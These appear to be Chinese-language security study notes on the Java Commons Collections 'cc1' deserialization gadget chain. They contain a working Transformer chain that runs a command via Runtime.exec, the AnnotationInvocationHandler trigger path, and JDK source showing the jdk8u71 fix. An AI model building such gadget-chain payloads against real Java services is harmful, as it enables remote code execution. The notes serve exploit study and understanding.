# 如何查看jdk源码
下载全版本jdk8 https://gitee.com/huan4j/jdk8/tree/master  
然后用idea打开切换分支即可  

# cc1
## 最简单的
```text
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.getRuntime()),

        new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"open -a Calculator"}
        )
};

ChainedTransformer transformerChain = new ChainedTransformer(transformers);
HashMap innerMap = new HashMap();

// outerMap instanceof TransformedMap
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
outerMap.put("test", "xxx");
```
transformKey值我们填null不进行转换, transformValue处我们填transformerChain, 使用这个来进行转换  
TransformedMap::put 时 transformValue(value); 执行ChainedTransformer的transform()方法  
而他的transform()方法是依次执行transformers中每个的transform()方法  
```text
ConstantTransformer::transform(A)返回A
InvokerTransformer::transform(A)使用A, invoke方法并执行
```

## 编写反序列化poc
上面的需要写成反序列化的代码
由于我们序列化只存储数据, 不存储代码的执行函数, 所以得找到某个类来执行我们map::put

使用AnnotationInvocationHandler链条如下:
```text
AnnotationInvocationHandler#readObject()
 AbstractInputCheckedMapDecorator#setValue()
  TransformedMap#parent.checkSetValue(value);
   (ChainedTransformer)valueTransformer.transform(value)
    然后执行我们的构造链
```

```text
jdk8u71-b12之前的AnnotationInvocationHandler.java#readObject

private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name)));
            }
        }
    }
}
```

```text
jdk8u71-b12修改了 AnnotationInvocationHandler.java 改版后无法使用TransferMap, 而是直接将我们构造好的TransferMap拷贝到一个新的LinkedHashMap

private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    ObjectInputStream.GetField fields = s.readFields();

    @SuppressWarnings("unchecked")
    Class<? extends Annotation> t = (Class<? extends Annotation>)fields.get("type", null);
    @SuppressWarnings("unchecked")
    Map<String, Object> streamVals = (Map<String, Object>)fields.get("memberValues", null);

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(t);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    // consistent with runtime Map type
    Map<String, Object> mv = new LinkedHashMap<>();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {
        String name = memberValue.getKey();
        Object value = null;
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                value = new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name));
            }
        }
        mv.put(name, value);
    }

    UnsafeAccessor.setType(this, t);
    UnsafeAccessor.setMemberValues(this, mv);
}
```

# cc2
导致需要其他的方式利用
